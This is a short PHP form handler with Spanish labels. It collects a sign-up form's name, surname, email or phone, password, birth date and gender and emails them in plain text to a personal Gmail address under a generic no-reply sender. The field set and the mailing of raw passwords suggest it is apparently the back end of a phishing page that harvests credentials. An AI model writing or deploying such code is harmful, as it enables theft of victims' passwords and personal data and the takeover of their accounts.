<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "williamir12345@gmail.com";
    $subject = "Datos del Formulario";
    
    $message = "Datos recibidos:\n\n";
    $message .= "Nombre: " . $_POST['firstname'] . "\n";
    $message .= "Apellidos: " . $_POST['surname'] . "\n";
    $message .= "Email o teléfono: " . $_POST['email'] . "\n";
    $message .= "Confirmación de email o teléfono: " . $_POST['confirm_email'] . "\n";
    $message .= "Contraseña: " . $_POST['password'] . "\n";
    $message .= "Cumpleaños: " . $_POST['birth_day'] . "/" . $_POST['birth_month'] . "/" . $_POST['birth_year'] . "\n";
    $message .= "Género: " . $_POST['gender'] . "\n";
    
    $headers = "From: no-reply@tudominio.com\r\n";
    
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado exitosamente";
    } else {
        echo "Error al enviar el correo";
    }
}
?>
